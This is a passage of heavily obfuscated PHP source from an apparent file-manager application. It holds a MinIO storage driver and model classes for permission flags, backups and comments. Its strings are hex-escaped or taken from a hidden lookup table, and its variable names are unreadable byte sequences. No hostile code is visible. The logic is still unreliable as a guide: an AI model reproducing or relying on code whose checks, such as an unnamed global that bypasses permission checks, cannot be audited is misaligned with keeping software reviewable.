= $ä°Ò›©‘[$®¬Ñ•³[201]][0][$®¬Ñ•³[32]]; return stripos($İº²ÁåÕ, $¼ª…Öèû . $®¬Ñ•³[8]) === 0 ? !0 : !1; if (substr($İº²ÁåÕ, -1) == $®¬Ñ•³[8]) { return !0; } if (get_path_this($İº²ÁåÕ) == get_path_this($¼ª…Öèû)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÎòŠ—Ğê) { parent::__construct($ÎòŠ—Ğê); $this->signatureVersion($_SERVER[Ôó‡è­ƒ][215]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto a‹ÆÒÀ¤•ˆ; EŸÃ´«ï¤Ş: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $„Ñ· ë =& $_SERVER[Ôó‡è­ƒ]; $ù‡±”ò = array(array($„Ñ· ë[417] => LNG($„Ñ· ë[1824]), $„Ñ· ë[1825] => $„Ñ· ë[1826], $„Ñ· ë[1827] => 1, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($„Ñ· ë[417] => LNG($„Ñ· ë[1830]), $„Ñ· ë[1825] => $„Ñ· ë[1831], $„Ñ· ë[1827] => 2, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($„Ñ· ë[417] => LNG($„Ñ· ë[1832]), $„Ñ· ë[1825] => $„Ñ· ë[1833], $„Ñ· ë[1827] => 3, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($„Ñ· ë[417] => LNG($„Ñ· ë[1834]), $„Ñ· ë[1825] => $„Ñ· ë[1835], $„Ñ· ë[1827] => 4, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_VIEW), array($„Ñ· ë[417] => LNG($„Ñ· ë[1836]), $„Ñ· ë[1825] => $„Ñ· ë[1837], $„Ñ· ë[1827] => 5, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($„Ñ· ë[417] => LNG($„Ñ· ë[1838]), $„Ñ· ë[1825] => $„Ñ· ë[1839], $„Ñ· ë[1827] => 6, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($„Ñ· ë[417] => LNG($„Ñ· ë[1840]), $„Ñ· ë[1825] => $„Ñ· ë[1841], $„Ñ· ë[1827] => 7, $„Ñ· ë[1828] => 1, $„Ñ· ë[1829] => 0)); return $ù‡±”ò; } public static function authCheck($·¹£öËã, $Éóë‹â) { $·¹£öËã = intval($·¹£öËã); if ($GLOBALS[$_SERVER[Ôó‡è­ƒ][499]]) { return !0; } if ($·¹£öËã <= 0) { return !1; } if (($·¹£öËã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($·¹£öËã & $Éóë‹â); } public static function authCheckShow($º…«şø) { return self::authCheck($º…«şø, self::AUTH_SHOW); } public static function authCheckView($ìŒ¶éŒ°) { return self::authCheck($ìŒ¶éŒ°, self::AUTH_VIEW); } public static function authCheckDownload($©¢íˆã·) { return self::authCheck($©¢íˆã·, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ó•…Œ×¦) { return self::authCheck($ó•…Œ×¦, self::AUTH_UPLOAD); } public static function authCheckEdit($Í¸‡úŸ‰) { return self::authCheck($Í¸‡úŸ‰, self::AUTH_EDIT); } public static function authCheckRemove($ş‚ƒ×ƒû) { return self::authCheck($ş‚ƒ×ƒû, self::AUTH_REMOVE); } public static function authCheckShare($ƒå¤šİ) { return self::authCheck($ƒå¤šİ, self::AUTH_SHARE); } public static function authCheckComment($Êú´¶û) { return self::authCheck($Êú´¶û, self::AUTH_COMMENT); } public static function authCheckEvent($îŸÒˆ‹) { return self::authCheck($îŸÒˆ‹, self::AUTH_EVENT); } public static function authCheckRoot($ˆœÅôüˆ) { return self::authCheck($ˆœÅôüˆ, self::AUTH_ROOT); } public static function authCheckAction($Î»œÁ›Ö, $Ëö÷Íğ¯) { $ïƒ®É·÷ =& $_SERVER[Ôó‡è­ƒ]; $’Ş‘Ëû™ = array($ïƒ®É·÷[1842] => self::AUTH_VIEW, $ïƒ®É·÷[1197] => self::AUTH_DOWNLOAD, $ïƒ®É·÷[108] => self::AUTH_UPLOAD, $ïƒ®É·÷[1793] => self::AUTH_EDIT, $ïƒ®É·÷[1792] => self::AUTH_REMOVE, $ïƒ®É·÷[1803] => self::AUTH_SHARE, $ïƒ®É·÷[353] => self::AUTH_COMMENT, $ïƒ®É·÷[1643] => self::AUTH_EVENT, $ïƒ®É·÷[1843] => self::AUTH_ROOT); if (!isset($’Ş‘Ëû™[$Ëö÷Íğ¯])) { return; } $ºÆŞÇ÷ë = $’Ş‘Ëû™[$Ëö÷Íğ¯]; $Î»œÁ›Ö = intval($Î»œÁ›Ö); if ($Î»œÁ›Ö <= 0) { return !1; } if (($Î»œÁ›Ö & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Î»œÁ›Ö & $ºÆŞÇ÷ë); } public static function authDisable($À…´Ğ´ğ, $¼ôëó¼š) { if (intval($À…´Ğ´ğ) <= 0) { return 0; } return intval($À…´Ğ´ğ) & ~$¼ôëó¼š; } public $optionType = "\x53\x79\x73\164\x65\x6d\56\163\x6f\x75\x72\143\x65\x41\x75\164\x68\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\141\165\164\150", "\154\x61\x62\x65\x6c", "\144\x69\x73\x70\154\x61\x79", "\x73\171\163\x74\145\x6d", "\163\157\162\x74"); public function initData() { $©¸Šõ ¤ = $this->authDefault(); foreach ($©¸Šõ ¤ as $¢‘‰´ïä) { $this->add($¢‘‰´ïä); } } public function findAuth($÷¨š®ğË, $ñ°Ü¡ş€) { $Â‰ÒÄµÕ =& $_SERVER[Ôó‡è­ƒ]; $¢‰¾Ã¢ş = parent::listData(); foreach ($¢‰¾Ã¢ş as $İæëø²É) { $³ÜòÌè° = intval($İæëø²É[$Â‰ÒÄµÕ[410]]); if ($³ÜòÌè° <= 0 || $İæëø²É[$Â‰ÒÄµÕ[1844]] == 0) { continue; } if (($³ÜòÌè° & $÷¨š®ğË) != $÷¨š®ğË) { continue; } if (($³ÜòÌè° & $ñ°Ü¡ş€) != 0) { continue; } return $İæëø²É[$Â‰ÒÄµÕ[396]]; } return !1; } public function findAuthReadOnly() { $ùú¬«Ê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $»Î€œ¤¾ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ùú¬«Ê, $»Î€œ¤¾); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($¾ÜùÌšÃ = false, $›ÁÆ©Ş = "\163\x6f\162\x74", $•¿Ûâ¨ó = false) { return parent::listData($¾ÜùÌšÃ, $›ÁÆ©Ş, $•¿Ûâ¨ó); } public function update($—¤¶ßë, $Â“İÆ™¥) { $×ŸÓğÉî =& $_SERVER[Ôó‡è­ƒ]; $¹½®Ì¯ü = parent::listData($—¤¶ßë); $®“–óÇö = $this->findByName($Â“İÆ™¥[$×ŸÓğÉî[32]]); if (!$¹½®Ì¯ü || $®“–óÇö && $®“–óÇö[$×ŸÓğÉî[396]] != $¹½®Ì¯ü[$×ŸÓğÉî[396]]) { return !1; } $this->filterAuth($Â“İÆ™¥[$×ŸÓğÉî[410]]); return parent::update($—¤¶ßë, $Â“İÆ™¥); } public function remove($­–Øôâê) { $¹ğäÊŠ = parent::listData($­–Øôâê); if (!$¹ğäÊŠ || $¹ğäÊŠ[$_SERVER[Ôó‡è­ƒ][1274]]) { return !1; } return parent::remove($­–Øôâê); } public function add($ù“”Ö¹« = array()) { $Ù·Ô´ ˜ =& $_SERVER[Ôó‡è­ƒ]; if ($this->findByName($ù“”Ö¹«[$Ù·Ô´ ˜[32]])) { return !1; } $Öó»Èª§ = array($Ù·Ô´ ˜[32] => $Ù·Ô´ ˜[12], $Ù·Ô´ ˜[410] => 1, $Ù·Ô´ ˜[1845] => $Ù·Ô´ ˜[1833], $Ù·Ô´ ˜[1844] => 1, $Ù·Ô´ ˜[1274] => 0, $Ù·Ô´ ˜[1846] => 0); $ù“”Ö¹« = array_merge($Öó»Èª§, $ù“”Ö¹«); $ù“”Ö¹«[$Ù·Ô´ ˜[1846]] = $this->getSort(); $this->filterAuth($ù“”Ö¹«[$Ù·Ô´ ˜[410]]); return parent::insert($ù“”Ö¹«); } private function getSort() { $§–Ëı‘÷ =& $_SERVER[Ôó‡è­ƒ]; $›¬‡å“ú = parent::listData(); $ÔÎ…÷ß‘ = array_to_keyvalue($›¬‡å“ú, $§–Ëı‘÷[12], $§–Ëı‘÷[1846]); return empty($ÔÎ…÷ß‘) ? 0 : max($ÔÎ…÷ß‘) + 1; } private function filterAuth(&$ñ¸­Ê÷‡) { if (!$ñ¸­Ê÷‡) { return; } $á†¨™Âş = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $æí¤€­´ = array(); foreach ($á†¨™Âş as $ÖÃî¡) { if ($ñ¸­Ê÷‡ & $ÖÃî¡) { $æí¤€­´[] = $ÖÃî¡; } } if (in_array(self::AUTH_ROOT, $æí¤€­´)) { $ñ¸­Ê÷‡ = array_sum($á†¨™Âş); return; } $‘â±ÊÖ€ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($æí¤€­´ as $ÖÃî¡) { if (isset($‘â±ÊÖ€[$ÖÃî¡])) { $æí¤€­´ = array_merge($æí¤€­´, $‘â±ÊÖ€[$ÖÃî¡]); } } $æí¤€­´[] = self::AUTH_SHOW; $ñ¸­Ê÷‡ = array_sum(array_unique($æí¤€­´)); } public function sort($µ‚³›˜ö, $Ëå« Ë) { return parent::update($µ‚³›˜ö, $Ëå« Ë); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x62\x61\143\x6b\x75\160\114\x69\163\x74"; public $field = array("\x69\157", "\156\x61\155\145", "\163\164\x61\x74\165\x73", "\x63\157\156\x74\145\x6e\164", "\155\141\156\165\x61\x6c", "\162\145\163\165\154\x74", "\164\x69\x6d\145\106\162\x6f\x6d", "\x74\151\155\x65\124\x6f"); public function config() { $’Ù·¤· =& $_SERVER[Ôó‡è­ƒ]; $ŒìıÆÀ­ = Model($’Ù·¤·[768])->get($’Ù·¤·[778]); $ŒìıÆÀ­ = json_decode($ŒìıÆÀ­, !0); $ŒìıÆÀ­ = is_array($ŒìıÆÀ­) ? $ŒìıÆÀ­ : array(); if (!isset($ŒìıÆÀ­[$’Ù·¤·[753]])) { $ŒìıÆÀ­[$’Ù·¤·[753]] = $’Ù·¤·[89]; } unset($ŒìıÆÀ­[$’Ù·¤·[1625]]); Action($’Ù·¤·[1847])->taskInit(); Model($’Ù·¤·[1624])->cacheClear(); $û™À¨÷„ = $’Ù·¤·[1848]; $Şí‰¸´Ï = Model($’Ù·¤·[1849])->findByKey($’Ù·¤·[1643], $û™À¨÷„); if (!$Şí‰¸´Ï) { $Şí‰¸´Ï = array(); } if (isset($Şí‰¸´Ï[$’Ù·¤·[200]])) { $Şí‰¸´Ï[$’Ù·¤·[200]] = json_decode($Şí‰¸´Ï[$’Ù·¤·[200]], !0); } if (isset($ŒìıÆÀ­[$’Ù·¤·[200]])) { $Şí‰¸´Ï[$’Ù·¤·[200]][$’Ù·¤·[1628]] = $ŒìıÆÀ­[$’Ù·¤·[200]]; unset($ŒìıÆÀ­[$’Ù·¤·[200]]); } return array_merge($Şí‰¸´Ï, $ŒìıÆÀ­); } public function listData($¬ƒŒ„ğ = false, $ŞûÏ™û¥ = "\155\x6f\144\151\146\x79\124\151\x6d\x65", $Â–˜¸¥‹ = false) { return parent::listData($¬ƒŒ„ğ, $ŞûÏ™û¥, !0); } public function lastItem() { $õìò¼“Š = $this->listData(); return !empty($õìò¼“Š[0]) ? $õìò¼“Š[0] : null; } public function kill($×ñññ¿Ö) { $†ÜòÒÒÕ =& $_SERVER[Ôó‡è­ƒ]; $‘‘Ê¾Ù‡ = $this->listData($×ñññ¿Ö); if (!$‘‘Ê¾Ù‡ || empty($‘‘Ê¾Ù‡[$†ÜòÒÒÕ[32]])) { return !0; } Task::kill($†ÜòÒÒÕ[777]); Task::kill($†ÜòÒÒÕ[798]); Task::kill($†ÜòÒÒÕ[807]); $Òßïãè = $‘‘Ê¾Ù‡[$†ÜòÒÒÕ[32]]; $´ÊÜºš = TEMP_FILES . $†ÜòÒÒÕ[776] . $Òßïãè . $†ÜòÒÒÕ[8]; IO::remove($´ÊÜºš, !1); return $this->remove($×ñññ¿Ö); } public function remove($ç“ªÆòÂ) { $ê—°®ô = $this->listData($ç“ªÆòÂ); if (!$ê—°®ô) { return !0; } return $this->backupRemove($ê—°®ô); } private function backupRemove($¹œòÈ›à) { parent::remove($¹œòÈ›à[$_SERVER[Ôó‡è­ƒ][396]]); $Ãñ†áÔô = $this->backupPath($¹œòÈ›à); IO::remove($Ãñ†áÔô, !1); return !0; } private function backupPath($¶¸¥ˆ…¤) { $¥¯àê¥ =& $_SERVER[Ôó‡è­ƒ]; $‰í† í = $¶¸¥ˆ…¤[$¥¯àê¥[32]]; $÷‚Äè¾‹ = Model($¥¯àê¥[768])->get($¥¯àê¥[769]); $ÁÅúş¹ = substr(md5($¥¯àê¥[770] . $÷‚Äè¾‹ . $‰í† í), 0, 8); return "\x7b\151\157\72{$¶¸¥ˆ…¤[$¥¯àê¥[750]]}\x7d\x2f\144\141\164\141\x62\141\x73\145\57\x62\141\x63\153\165\160\57" . $‰í† í . $¥¯àê¥[11] . $ÁÅúş¹; } public function start() { $Ê“ì£ä =& $_SERVER[Ôó‡è­ƒ]; if ($GLOBALS[$Ê“ì£ä[6]][$Ê“ì£ä[90]][$Ê“ì£ä[1850]] != $Ê“ì£ä[89]) { return !0; } $´’ÛÌË– = $this->config(); if (!$´’ÛÌË– || $´’ÛÌË–[$Ê“ì£ä[1625]] != $Ê“ì£ä[89]) { return !1; } $Íø×ôß¶ = $this->process(); foreach ($Íø×ôß¶ as $í•Î†ìå) { if ($í•Î†ìå) { return Task::restart($í•Î†ìå[$Ê“ì£ä[396]]); } } $Ó‹ğ¼®× = new Backup(); $ò¨¡ıšÑ = $Ó‹ğ¼®×->db(); if ($ò¨¡ıšÑ) { $ò¨¡ıšÑ = $Ó‹ğ¼®×->dbFile(); if ($ò¨¡ıšÑ && $´’ÛÌË–[$Ê“ì£ä[753]] == $Ê“ì£ä[194]) { $ò¨¡ıšÑ = $Ó‹ğ¼®×->file(); } } Backup::set(array($Ê“ì£ä[748] => 1, $Ê“ì£ä[492] => time())); return !0; } public function process() { $¨èÛˆÕá =& $_SERVER[Ôó‡è­ƒ]; $¾¯ÀçÏÓ = array($¨èÛˆÕá[756] => Task::get($¨èÛˆÕá[777]), $¨èÛˆÕá[760] => Task::get($¨èÛˆÕá[798]), $¨èÛˆÕá[196] => Task::get($¨èÛˆÕá[807])); $µŸäîµû = !1; foreach ($¾¯ÀçÏÓ as &$Õˆ°»ï‹) { if ($µŸäîµû) { $Õˆ°»ï‹ = !1; continue; } if ($Õˆ°»ï‹) { $¬†ë±Ê = intval(_get($Õˆ°»ï‹, $¨èÛˆÕá[1660], 0)); if (time() - $¬†ë±Ê > 7200) { Task::kill($Õˆ°»ï‹[$¨èÛˆÕá[396]]); $µŸäîµû = !0; $Õˆ°»ï‹ = !1; } } } return $¾¯ÀçÏÓ; } public function restore() { $€‰£Ú¨± =& $_SERVER[Ôó‡è­ƒ]; ActionCall($€‰£Ú¨±[1060], !0, 1); ActionCall($€‰£Ú¨±[1060], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\x6d\x65" => "\143\157\x6d\x6d\x65\x6e\164\137\155\x65\164\x61", "\x6d\x65\x74\141\x46\151\145\154\144" => "\143\157\x6d\155\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ã¢‰ãÅœ) { $¤İ³Ê =& $_SERVER[Ôó‡è­ƒ]; if ($Ã¢‰ãÅœ[$¤İ³Ê[1851]]) { $‰‰¶ŞÑ¾ = $this->where(array($¤İ³Ê[1852] => $Ã¢‰ãÅœ[$¤İ³Ê[1851]]))->find(); if (!$‰‰¶ŞÑ¾ || $‰‰¶ŞÑ¾[$¤İ³Ê[408]] != $Ã¢‰ãÅœ[$¤İ³Ê[408]] || $‰‰¶ŞÑ¾[$¤İ³Ê[501]] != $Ã¢‰ãÅœ[$¤İ³Ê[501]]) { return !1; } $this->where(array($¤İ³Ê[1852] => $Ã¢‰ãÅœ[$¤İ³Ê[1851]]))->setAdd($¤İ³Ê[1853], 1); } $Ã¢‰ãÅœ[$¤İ³Ê[1854]] = 0; $Ã¢‰ãÅœ[$¤İ³Ê[1853]] = 0; $Ã¢‰ãÅœ[$¤İ³Ê[748]] = 1; return $this->add($Ã¢‰ãÅœ); } public function commentCount($ûŠÍÊ¹Ú, $Ñ ³” ù, $Øšâ÷ß = false) { $¼öÉˆ³ =& $_SERVER[Ôó‡è­ƒ]; if (!$ûŠÍÊ¹Ú) { return array(); } if (is_string($ûŠÍÊ¹Ú) || is_int($ûŠÍÊ¹Ú)) { $ûŠÍÊ¹Ú = array($ûŠÍÊ¹Ú); } $Ü×ŠÂÏÕ = array($¼öÉˆ³[501], $¼öÉˆ³[1855] => $¼öÉˆ³[496]); $Ò‡¼£‚ = array($¼öÉˆ³[501] => array($¼öÉˆ³[7], $ûŠÍÊ¹Ú), $¼öÉˆ³[408] => $Ñ ³” ù); if ($Øšâ÷ß) { $Ò‡¼£‚[$¼öÉˆ³[1655]] = $Øšâ÷ß; } $©ÕË©™ğ = $this->field($Ü×ŠÂÏÕ)->where($Ò‡¼£‚)->group($¼öÉˆ³[501])->select(); return array_to_keyvalue($©ÕË©™ğ, $¼öÉˆ³[501], $¼öÉˆ³[496]); } public function starTarget($±ÙŠ×º¥, $Õ—¾©ÛÎ) { $“æ‹¶òÌ =& $_SERVER[Ôó‡è­ƒ]; $ÛÌÙãîô = $±ÙŠ×º¥ + self::TYPE_STAR_OFFSET; $ÁÓß”àË = array($“æ‹¶òÌ[1655] => USER_ID, $“æ‹¶òÌ[408] => $ÛÌÙãîô, $“æ‹¶òÌ[501] => $Õ—¾©ÛÎ); $·Úíş¥ = $this->where($ÁÓß”àË)->find(); if ($·Úíş¥) { return $this->where(array($“æ‹¶òÌ[396] => $·Úíş¥[$“æ‹¶òÌ[396]]))->delete(); } $‹ƒ–à×¶ = array($“æ‹¶òÌ[1851] => 0, $“æ‹¶òÌ[1655] => USER_ID, $“æ‹¶òÌ[748] => 1, $“æ‹¶òÌ[753] => $“æ‹¶òÌ[12], $“æ‹¶òÌ[408] => $ÛÌÙãîô, $“æ‹¶òÌ[501] => $Õ—¾©ÛÎ, $“æ‹¶òÌ[1854] => 0, $“æ‹¶òÌ[1853] => 0); return $this->add($‹ƒ–à×¶); } public function starTargetCount($‹”Úêñ×, $îÀŞ¥à) { $¬ñÊı°¹ =& $_SERVER[Ôó‡è­ƒ]; $ÓºŞ×ıı = $îÀŞ¥à + self::TYPE_STAR_OFFSET; $ÛÖƒ±İÏ = $this->commentCount($‹”Úêñ×, $ÓºŞ×ıı); $¿ÑÃ—«Ù = $this->commentCount($‹”Úêñ×, $ÓºŞ×ıı, USER_ID); return array($¬ñÊı°¹[1856] => $ÛÖƒ±İÏ, $¬ñÊı°¹[1857] => $¿ÑÃ—«Ù); } public function starTargetUserList($õì¡Ç’Ê, $ò­¤ñ) { $ôáÓ­½Ë =& $_SERVER[Ôó‡è­ƒ]; $Ê¤ìø§ˆ = $õì¡Ç’Ê + self::TYPE_STAR_OFFSET; $ÙÚ¬·´§ = array($ôáÓ­½Ë[501] => $ò­¤ñ, $ôáÓ­½Ë[408] => $Ê¤ìø§ˆ); $ØîØşß³ = $this->where($ÙÚ¬·´§)->count(); $¡•í£¶¶ = array($ôáÓ­½Ë[254] => $ØîØşß³, $ôáÓ­½Ë[1858] => array()); if (!$ØîØşß³) { return $¡•í£¶¶; } $¼†±Ü•­ = $this->field($ôáÓ­½Ë[1655])->where($ÙÚ¬·´§)->limit(500)->select(); $¼†±Ü•­ = array_to_keyvalue($¼†±Ü•­, $ôáÓ­½Ë[12], $ôáÓ­½Ë[1655]); $¡•í£¶¶[$ôáÓ­½Ë[1858]] = Model($ôáÓ­½Ë[509])->userListInfo($¼†±Ü•­); return $¡•í£¶¶; } public function prasiseUserList($µ¦¡ûÒ…) { $øŞ—úÅ˜ =& $_SERVER[Ôó‡è­ƒ]; $øµË‘°© = array($øŞ—úÅ˜[1859] => $µ¦¡ûÒ…); $ë®À©Ìí = $this->where($øµË‘°©)->find(); $é¤è•å€ = _get($ë®À©Ìí, $øŞ—úÅ˜[1854], 0); $‰€ıŞ“ = array($øŞ—úÅ˜[254] => $é¤è•å€, $øŞ—úÅ˜[1858] => array()); if (!$é¤è•å€) { return $‰€ıŞ“; } $Öğ«°İ = Model($øŞ—úÅ˜[1860])->field($øŞ—úÅ˜[1655])->where($øµË‘°©)->limit(500)->select(); $Öğ«°İ = array_to_keyvalue($Öğ«°İ, $øŞ—úÅ˜[12], $øŞ—úÅ˜[1655]); $‰€ıŞ“[$øŞ—úÅ˜[1858]] = Model($øŞ—úÅ˜[509])->userListInfo($Öğ«°İ); return $‰€ıŞ“; } public function remove($‚ÏŒó×Â) { $ÄÎ‚‘¸œ =& $_SERVER[Ôó‡è­ƒ]; $ß½áóù‘ = array($ÄÎ‚‘¸œ[1852] => $‚ÏŒó×Â); $€ËÓİ³â = $this->where($ß½áóù‘)->find(); if ($€ËÓİ³â[$ÄÎ‚‘¸œ[1851]]) { $this->where(array($ÄÎ‚‘¸œ[1852] => $€ËÓİ³â[$ÄÎ‚‘¸œ[1851]]))->setAdd($ÄÎ‚‘¸œ[1853], -1); } return $this->where($ß½áóù‘)->delete(); } public function edit($Áô‘›Ï‰, $ÃıÚ¢Œø) { $›¦°í =& $_SERVER[Ôó‡è­ƒ]; $Ûî•ı± = array($›¦°í[1852] => $Áô‘›Ï‰); return $this->where($Ûî•ı±)->save(array($›¦°í[1861] => $ÃıÚ¢Œø)); } public function prasise($ùÖ¸Çª ) { $Ş—ƒ„ÏÉ =& $_SERVER[Ôó‡è­ƒ]; $ÈËî©ß = Model($Ş—ƒ„ÏÉ[1862]); $ğ¥¸¶¼× = array($Ş—ƒ„ÏÉ[1852] => $ùÖ¸Çª , $Ş—ƒ„ÏÉ[1646] => USER_ID); $ƒ³ÎÄı» = $ÈËî©ß->where($ğ¥¸¶¼×)->find(); if (!$ƒ³ÎÄı») { $ÈËî©ß->add($ğ¥¸¶¼×); $º³ Œƒ­ = $this->where(array($Ş—ƒ„ÏÉ[1852] => $ùÖ¸Çª ))->setAdd($Ş—ƒ„ÏÉ[1854], 1); } else { $ÈËî©ß->where($ğ¥¸¶¼×)->delete(); $º³ Œƒ­ = $this->where(array($Ş—ƒ„ÏÉ[1852] => $ùÖ¸Çª ))->setAdd($Ş—ƒ„ÏÉ[1854], -1); } return $º³ Œƒ­; } public function targetInfo($¤´á¦», $Šñ›Ô®Ä) { $ÕŞô¨¾† =& $_SERVER[Ôó‡è­ƒ]; $ôà¾ØŠµ = array($ÕŞô¨¾†[579] => $¤´á¦», $ÕŞô¨¾†[580] => $Šñ›Ô®Ä); $çæÉ‡­ = $this->where($ôà¾ØŠµ)->count(); $ÓÍçùñ = "\x52\x49\x47\110\124\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\155\x6d\x65\156\x74\137\160\162\x61\151\163\x65\40\x73\x74\141\x72\40\x6f\156\x20\143\x6f\x6d\x6d\145\x6e\164\56\x63\x6f\155\x6d\x65\x6e\164\x49\x44\40\x3d\40\163\164\141\162\x2e\x63\157\x6d\x6d\x65\156\x74\111\104"; $§¹ÎõÜ© = $this->alias($ÕŞô¨¾†[353])->where($ôà¾ØŠµ)->join($ÓÍçùñ, $ÕŞô¨¾†[1863])->count(); $ÅÇ±à£Ø = array($ÕŞô¨¾†[1864] => $çæÉ‡­, $ÕŞô¨¾†[1865] => $§¹ÎõÜ©); return $ÅÇ±à£Ø; } public function listData($äÈ¥ÙÄ ) { $Ú¢‘§ú• =& $_SERVER[Ôó‡è­ƒ]; if (isset($äÈ¥ÙÄ [$Ú¢‘§ú•[1866]])) { if ($äÈ¥ÙÄ [$Ú¢‘§ú•[1866]]) { $äÈ¥ÙÄ [$Ú¢‘§ú•[1859]] = array($Ú¢‘§ú•[1014], intval($äÈ¥ÙÄ [$Ú¢‘§ú•[1866]])); } unset($äÈ¥ÙÄ [$Ú¢‘§ú•[1866]]); } if (isset($äÈ¥ÙÄ [$Ú¢‘§ú•[1867]])) { if ($äÈ¥ÙÄ [$Ú¢‘§ú•[1867]]) { $äÈ¥ÙÄ [$Ú¢‘§ú•[1859]] = array($Ú¢‘§ú•[1011], intval($äÈ¥ÙÄ [$Ú¢‘§ú•[1867]])); } unset($äÈ¥ÙÄ [$Ú¢‘§ú•[1867]]); } return $this->_listData($äÈ¥ÙÄ ); } private function _listData($²ª†ÔÄò) { $À¬ÈÓÊ¤ =& $_SERVER[Ôó‡è­ƒ]; $‡áöĞ›™ = $this->where($²ª†ÔÄò)->_makeOrder()->selectPage(100); $this->_listAppendParent($‡áöĞ›™[$À¬ÈÓÊ¤[368]]); $this->_listAppendUser($‡áöĞ›™[$À¬ÈÓÊ¤[368]]); $this->_listAppendMeta($‡áöĞ›™[$À¬ÈÓÊ¤[368]]); return $‡áöĞ›™; } private function _makeOrder() { $¸¹¯ĞÄ× =& $_SERVER[Ôó‡è­ƒ]; $ë‚É˜Êò = array($¸¹¯ĞÄ×[1854], $¸¹¯ĞÄ×[1853], $¸¹¯ĞÄ×[197]); $ŸèÏÎ÷ = Input::get($¸¹¯ĞÄ×[451], $¸¹¯ĞÄ×[7], $¸¹¯ĞÄ×[420], $ë‚É˜Êò); $à¼´İ– = Input::get($¸¹¯ĞÄ×[452], $¸¹¯ĞÄ×[7], $¸¹¯ĞÄ×[1648], array($¸¹¯ĞÄ×[1868], $¸¹¯ĞÄ×[447])); $ı›î¢ì = $ŸèÏÎ÷ . $¸¹¯ĞÄ×[53] . $à¼´İ–; return $this->order($ı›î¢ì); } private function _listAppendParent(&$¯¡á’ú¡) { $ÄˆÚ®Ó÷ =& $_SERVER[Ôó‡è­ƒ]; $Äµ‹Ÿ½¥ = array_unique(array_to_keyvalue($¯¡á’ú¡, $ÄˆÚ®Ó÷[12], $ÄˆÚ®Ó÷[1851])); $Äµ‹Ÿ½¥ = array_remove_value($Äµ‹Ÿ½¥, $ÄˆÚ®Ó÷[194]); if (!$Äµ‹Ÿ½¥) { return; } $Ü´²˜Ú = $this->where(array($ÄˆÚ®Ó÷[1852] => array($ÄˆÚ®Ó÷[7], $Äµ‹Ÿ½¥)))->select(); $Ü´²˜Ú = array_to_keyvalue($Ü´²˜Ú, $ÄˆÚ®Ó÷[1859]); foreach ($¯¡á’ú¡ as &$İ¯½üÂì) { if (isset($Ü´²˜Ú[$İ¯½üÂì[$ÄˆÚ®Ó÷[1851]]])) { $İ¯½üÂì[$ÄˆÚ®Ó÷[1869]] = $Ü´²˜Ú[$İ¯½üÂì[$ÄˆÚ®Ó÷[1851]]]; } } unset($İ¯½üÂì); } private function _listAppendUser(&$—ùÇ³İ) { $ˆ ¿Ó–ò =& $_SERVER[Ôó‡è­ƒ]; $ŠÙï—âº = array_unique(array_to_keyvalue($—ùÇ³İ, $ˆ ¿Ó–ò[12], $ˆ ¿Ó–ò[1655])); 